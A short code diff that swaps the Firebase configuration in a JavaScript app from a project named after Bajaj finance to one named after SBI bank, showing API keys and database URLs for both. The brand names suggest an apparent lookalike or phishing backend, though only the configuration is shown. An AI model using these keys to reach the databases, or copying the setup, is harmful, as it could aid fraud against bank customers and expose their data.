@@ -14,13 +14,13 @@ import {
 } from 'firebase/database';
 
 const firebaseConfig = {
-  apiKey: "AIzaSyAHjykH13muJMOdkFaEehUkHvWcSUCLT3Y",
-  authDomain: "bajaj-instant-approve.firebaseapp.com",
-  databaseURL: "https://bajaj-instant-approve-default-rtdb.firebaseio.com",
-  projectId: "bajaj-instant-approve",
-  storageBucket: "bajaj-instant-approve.firebasestorage.app",
-  messagingSenderId: "662103149147",
-  appId: "1:662103149147:web:b95d50add890ef44448d7e"
+  apiKey: "AIzaSyDOCAxkrREX1uWDU7Q765_YnXCptAsT_x4",
+  authDomain: "sbi-bank-smart.firebaseapp.com",
+  databaseURL: "https://sbi-bank-smart-default-rtdb.firebaseio.com",
+  projectId: "sbi-bank-smart",
+  storageBucket: "sbi-bank-smart.firebasestorage.app",
+  messagingSenderId: "47138803332",
+  appId: "1:47138803332:web:5cf924f6473772fab7fcd1"
 };
 
 const app = initializeApp(firebaseConfig);
